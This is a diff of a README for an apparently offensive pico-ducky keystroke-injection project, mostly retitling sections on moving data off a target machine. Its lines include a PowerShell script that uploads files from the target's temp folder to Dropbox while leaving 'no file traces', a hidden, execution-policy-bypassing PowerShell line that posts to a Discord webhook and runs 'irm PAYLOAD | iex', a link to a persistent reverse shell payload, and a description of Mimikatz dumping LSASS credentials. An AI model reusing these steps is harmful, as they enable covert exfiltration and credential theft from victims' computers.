@@ -180,7 +180,7 @@ This will run the SSH service until the device is shut down.
 For an in depth explanation of the SSH service and installation/troubleshooting process refer to this [article](https://theitbros.com/ssh-into-windows/).
 
 
-#### Other Transfer Methods
+#### Upload via Dropbox API
 - After verifying Internet Connection, files can be uploaded to Dropbox by using the Dropbox API token and including it in the script. This ensures no file traces exists in the target device. Below is a powershell script that uploads a specified file from the device's %temp% folder to Dropbox using its API.
   ```
   $TargetFilePath="/$FileName"
@@ -194,7 +194,7 @@ For an in depth explanation of the SSH service and installation/troubleshooting 
   Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
   ```
 
-- The output file can also be uploaded to a Discord channel via a discord webhook.
+#### Upload to Discord channel via a discord webhook
   ```
   STRING powershell -w h -ep bypass $discord='
 
@@ -206,6 +206,7 @@ For an in depth explanation of the SSH service and installation/troubleshooting 
   STRINGLN ';irm PAYLOAD | iex
   ```
 
+#### Send file to Ducky-Pico Storage
 - Files may also be stored onto the physical HID pico-ducky storage itself by checking the drive letter assigned to it in the target device file system and copying the files into the drive root directory.
   ```
   STRING $destinationLabel = "RPI-RP2"
@@ -221,7 +222,7 @@ Some more interesting payloads
 - [Persistent ReverseShell Ducky](https://github.com/drapl0n/persistentReverseDucky/tree/main)
 
 
-[MIMIkatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
+[Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) is an extremely powerful tool used within some payloads which is capable of extracting Windows user login credentials, hashes, keys, pin codes, tickets from the memory of `LSASS` (Local Security Authority Subsystem Service).
 
 # Decrypting Passwords
 
